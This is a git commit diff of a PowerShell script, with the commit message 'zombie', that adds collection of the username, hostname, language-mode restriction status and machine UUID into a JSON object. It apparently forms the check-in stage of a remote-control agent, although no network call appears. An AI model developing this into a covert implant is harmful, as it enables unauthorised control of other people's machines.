15c9d7b3c6b0d56cbae63fe622c9f0a470e68f0e
axano <okmanolos1@hotmail.com>
2020-06-18 14:24:14 +0200

    zombie

--- darpa/main.ps1
+++ darpa/main.ps1
@@ -1,1 +1,18 @@
-get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID
+$username = whoami
+$hostname = hostname
+$is_clm_active = $ExecutionContext.SessionState.LanguageMode
+$uuid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID
+echo $username
+echo $hostname
+echo $is_clm_active
+echo $uuid
+
+$json = @"
+{
+			"uuid": "$uuid",
+			"username": "$username",
+			"hostname": "$hostname",
+			"clm": "$is_clm_active",
+			"last_boot_time": "$last_boot_time"
+}
+"@
